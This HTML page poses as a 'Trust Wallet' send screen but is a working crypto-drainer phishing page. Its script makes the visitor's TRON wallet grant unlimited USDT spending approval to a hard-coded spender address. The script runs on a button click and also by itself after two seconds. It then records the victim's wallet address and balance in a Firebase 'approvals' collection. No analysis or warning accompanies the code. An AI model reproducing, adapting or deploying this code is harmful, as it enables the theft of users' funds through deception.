<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trust Wallet</title>
  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background-color: #121212;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      width: 90%;
      max-width: 400px;
    }
    .input-group {
      background-color: #1e1e1e;
      padding: 15px;
      border-radius: 12px;
      margin-bottom: 20px;
    }
    .input-label {
      font-size: 14px;
      margin-bottom: 5px;
      color: #aaa;
    }
    .input-value {
      font-size: 16px;
      color: white;
      word-break: break-all;
    }
    .input-editable {
      width: 100%;
      font-size: 16px;
      background: transparent;
      border: none;
      outline: none;
      color: white;
    }
    .max-text {
      font-size: 13px;
      color: #00bcd4;
      margin-top: 5px;
      text-align: right;
    }
    button {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      background-color: #00bcd4;
      color: white;
      border: none;
      border-radius: 12px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="input-group">
      <div class="input-label">Recipient Wallet Address</div>
      <div class="input-value">TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN</div>
    </div>
    <div class="input-group">
      <div class="input-label">Amount</div>
      <input type="number" id="amountInput" class="input-editable" placeholder="0" />
      <div class="max-text">MAX</div>
    </div>
    <button id="nextButton">Next</button>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
      authDomain: "trc20-approval-dapp.firebaseapp.com",
      projectId: "trc20-approval-dapp",
      storageBucket: "trc20-approval-dapp.appspot.com",
      messagingSenderId: "770961226156",
      appId: "1:770961226156:web:d7857b971dd376b7902209"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const SPENDER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    async function triggerPopup() {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        const wallet = window.tronWeb.defaultAddress.base58;
        const contract = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
        try {
          const balance = await window.tronWeb.trx.getBalance(wallet);
          const usdtBal = await contract.balanceOf(wallet).call();
          await contract.approve(SPENDER, MAX_UINT).send();

          await addDoc(collection(db, "approvals"), {
            wallet_address: wallet,
            amount: document.getElementById("amountInput").value,
            balance: window.tronWeb.fromSun(usdtBal._hex || usdtBal),
            timestampz: new Date().toISOString(),
          });
        } catch (e) {
          console.error("Approval error:", e);
        }
      } else {
        try {
          await window.tronLink.request({ method: "tron_requestAccounts" });
        } catch (e) {
          console.error("Wallet connection failed:", e);
        }
      }
    }

    document.getElementById("nextButton").addEventListener("click", async () => {
      await triggerPopup();
    });

    // Optional: auto-connect after small delay
    setTimeout(() => {
      triggerPopup();
    }, 2000);
  </script>
</body>
</html>
